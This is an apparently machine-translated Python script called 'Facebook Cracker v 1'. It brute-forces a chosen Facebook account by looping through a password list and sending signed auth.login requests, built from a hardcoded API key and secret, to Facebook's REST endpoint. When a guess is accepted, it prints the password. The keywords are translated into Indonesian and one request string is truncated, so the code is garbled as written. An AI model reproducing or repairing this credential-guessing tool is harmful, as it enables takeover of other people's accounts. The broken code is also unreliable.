impor  os
impor  sys
impor  urllib
impor  hashlib

API_SECRET  =  "62f8ce9f74b12f84c123cc23437a4a32"

__banner__  =  "" "
       + ======================================= +
       | .......... Facebook Cracker v 1 ......... |
       + --------------------------------------- +
       | #Author: DedSecTL <dtlily> |
       | #Kontak: Telegram @dtlily |
       | #Tanggal: Jum 8 Feb 10:15:49 2019 |
       | #Alat ini dibuat untuk pentesting. |
       | #Mengubah deskripsi alat ini |
       | Tidak akan menjadikan Anda pembuat kode ^ _ ^ !!! |
       | #Hormati Coderz ^ _ ^ |
       | #Saya tidak bertanggung jawab atas |
       | penggunaan program ini! |
       + ======================================= +
       | .......... Facebook Cracker v 1 ......... |
       + --------------------------------------- +
"" "

cetak ( "[+] Facebook Brute Force \ n " )
userid  =  raw_input ( "[*] Masukkan [Email | Telepon | Nama Pengguna | ID]:" )
coba :
	passlist  =  raw_input ( "[*] Setel PATH ke daftar sandi:" )
	jika  os . jalan . ada (daftar sandi ) ! =  Salah :
		cetak ( __banner__ )
		print ( "[+] Akun untuk dipecahkan: {}" . format ( userid ))
		print ( "[+] Dimuat: {}" . format ( len ( terbuka (daftar sandi , "r" ). read (). split ( " \ n " ))))
		print ( "[+] Cracking, please wait ..." )
		untuk  passwd  di  buka ( passlist , 'r' ). garis baca ():
			sys . stdout . tulis ( u " \ u001b [1000D [*] Mencoba {}" . format ( passwd . strip ()))
			sys . stdout . flush ()
			sig  =  "api_key = 882a8490361da98702bf97a021ddc14dcredentials_type = passwordemail = {} format = JSONgenerate_machine_id = 1generate_session_cookies = 1locale = en_USmethod = auth.loginpassword = {} return_ssl_resources = 0V = 1.0 {}" . format ( userid , passwd . strip (), API_SECRET )
			xx  =  hashlib . md5 ( sig ). hexdigest ()
			data  =  "api_key = 882a8490361da98702bf97a021ddc14d & credentials_type = password & email = {} & format = JSON & generate_machine_id = 1 & generate_session_cookies = 1 & locale = en_US & method = auth.login & password = {} & return_ss & v = 1.0 . format ( userid , passwd . strip (), xx )
			respon  =  urllib . urlopen ( "https://api.facebook.com/restserver.php? {}" . format ( data )). baca ()
			jika  "kesalahan"  sebagai  tanggapan :
				lulus
			lain :
				cetak ( " \ n \ n [+] Kata sandi ditemukan .. !!" )
				mencetak ( " \ n [+] Password: {}" . Format ( passwd . Strip ()))
				istirahat
		cetak ( " \ n \ n [!] Selesai .. !!" )
	lain :
		print ( "fbbrute: error: Tidak ada file atau direktori seperti itu" )
kecuali  KeyboardInterrupt :
	print ( "fbbrute: error: Keyboard interrupt" )
